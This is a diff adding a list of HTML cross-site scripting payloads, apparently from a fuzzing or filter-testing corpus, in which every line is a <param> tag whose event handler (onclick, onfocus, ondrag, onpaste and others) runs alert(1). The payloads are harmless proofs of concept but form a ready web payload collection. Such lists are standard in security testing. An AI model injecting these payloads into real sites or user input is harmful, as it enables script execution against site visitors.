@@ -1,0 +1,32 @@
+<param draggable="true" ondrag="alert(1)">test</param>
+<param draggable="true" ondragend="alert(1)">test</param>
+<param draggable="true" ondragenter="alert(1)">test</param>
+<param draggable="true" ondragleave="alert(1)">test</param>
+<param draggable="true" ondragstart="alert(1)">test</param>
+<param id=x tabindex=1 onactivate=alert(1)></param>
+<param id=x tabindex=1 onbeforeactivate=alert(1)></param>
+<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
+<param id=x tabindex=1 onfocus=alert(1)></param>
+<param id=x tabindex=1 onfocusin=alert(1)></param>
+<param onbeforecopy="alert(1)" contenteditable>test</param>
+<param onbeforecut="alert(1)" contenteditable>test</param>
+<param onbeforepaste="alert(1)" contenteditable>test</param>
+<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onclick="alert(1)">test</param>
+<param oncontextmenu="alert(1)">test</param>
+<param oncopy="alert(1)" contenteditable>test</param>
+<param oncut="alert(1)" contenteditable>test</param>
+<param ondblclick="alert(1)">test</param>
+<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
+<param onkeydown="alert(1)" contenteditable>test</param>
+<param onkeypress="alert(1)" contenteditable>test</param>
+<param onkeyup="alert(1)" contenteditable>test</param>
+<param onmousedown="alert(1)">test</param>
+<param onmouseenter="alert(1)">test</param>
+<param onmouseleave="alert(1)">test</param>
+<param onmousemove="alert(1)">test</param>
+<param onmouseout="alert(1)">test</param>
+<param onmouseover="alert(1)">test</param>
+<param onmouseup="alert(1)">test</param>
+<param onpaste="alert(1)" contenteditable>test</param>
